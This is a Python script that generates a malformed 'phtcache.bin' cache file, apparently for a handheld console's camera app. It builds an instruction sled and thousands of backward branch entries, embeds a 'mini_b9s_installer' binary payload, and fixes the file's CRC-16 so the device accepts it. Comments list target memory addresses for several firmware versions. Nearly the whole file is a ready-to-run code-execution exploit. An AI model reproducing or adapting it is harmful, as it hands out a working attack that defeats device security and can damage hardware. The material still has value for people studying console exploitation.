import os,sys,struct,random

'''
254a0ee0  bottom screen
254AEFE0  top screen    old 11.17  us/eu/jp e0 ef 54 02
2550fbe0  both screens

2908efe0  new 11.17

2dbf0000  new heap
fffb541c FFFFFFFF0004ABE4
fffb5388 FFFFFFFF0004AC78
'''

OFFSET=0xfffc
IS_SD=0x0001

ACTUAL_ENTRIES=3000                      
USED_PIC_COUNT1=0x0000   #pictures + 1
UNKNOWN1=0x0000
USED_PIC_COUNT2=0x0000 #seems to matter
MASTER_TOTAL=3000    #essential
FOLDERNUM=0x0000

pad=b"\x00"
offset=OFFSET-0x18
entries=ACTUAL_ENTRIES

if ACTUAL_ENTRIES > 3000:
	entries=3000

header_area=b""
for i in range(0,offset,4):
	header_area+=struct.pack("<I",0xe1a0600f)

with open("mini_b9s_installer/mini_b9s_installer.bin","rb") as f:
	mini=f.read()

DATA=b""
branch=0xeafffffe #branch backward into header area where payload resides
branch-=(OFFSET//4)
for i in range(ACTUAL_ENTRIES):
	DATA+=(0x94*pad)+struct.pack("<I", branch)
	branch-=(0x98//4)

magic=b"1UJQ00_1"    #0TIP00_1

template=magic+struct.pack("<HHHHHHI",USED_PIC_COUNT1,UNKNOWN1,MASTER_TOTAL,IS_SD,FOLDERNUM,USED_PIC_COUNT2,0x18FBD2)+(header_area)+(pad*(entries*0x98))

def crc16(data):
	''' CRC-16-STANDARD (arc)	Algorithm '''
	data = bytearray(data)
	poly=0xa001
	crc = 0x0000
	for b in data:
		cur_byte = 0xFF & b
		for _ in range(0, 8):
			if (crc & 0x0001) ^ (cur_byte & 0x0001):
				crc = (crc >> 1) ^ poly
			else:
				crc >>= 1
			cur_byte >>= 1

	return crc & 0xFFFF

def patch(data, off, handle):
	handle.seek(off)
	handle.write(data)

with open("phtcache.bin","wb+") as f:
	print("Patching phtcache.bin...")
	f.write(template)
	patch(DATA, OFFSET, f)
	patch(mini, 0x100, f)
	f.seek(0x14)
	f.write(b"\x00\x00")
	f.seek(0x16)
	f.write(struct.pack("<H",OFFSET))
	f.seek(0)
	data=f.read()
	crc=crc16(data)
	f.seek(0x14)
	f.write(struct.pack("<H",crc))

print("done")